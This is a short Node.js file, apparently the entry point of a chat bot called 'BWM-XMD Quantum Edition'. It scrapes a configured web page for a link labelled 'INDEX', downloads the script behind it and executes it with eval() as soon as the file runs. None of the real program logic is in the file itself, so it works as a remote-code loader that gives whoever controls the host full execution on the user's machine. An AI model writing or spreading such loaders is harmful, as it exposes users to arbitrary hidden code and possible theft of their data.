//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Benson Ngugi                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const ben = require("./config");

async function fetchINDEXUrl() {
  try {
    const response = await axios.get(ben.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("INDEX")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchINDEXUrl();
